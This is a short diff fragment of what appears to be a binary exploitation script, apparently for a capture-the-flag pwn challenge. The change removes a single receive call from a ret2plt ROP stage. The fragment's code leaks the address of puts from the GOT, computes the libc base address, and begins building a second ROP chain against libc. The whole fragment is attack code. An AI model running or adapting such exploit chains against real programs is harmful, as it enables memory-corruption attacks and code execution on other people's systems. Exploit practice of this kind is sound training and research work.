@@ -42,7 +42,6 @@ io.clean()
 rop.ret2plt(leak=elf.got.puts, ret=elf.sym.main)
 io.sendpayload(offset=offset, payload=rop.chain())
 
-io.recvline()
 libc.address = io.recv_libc_leak(offset=libc.sym.puts)
 
 rop1 = ROP(libc)
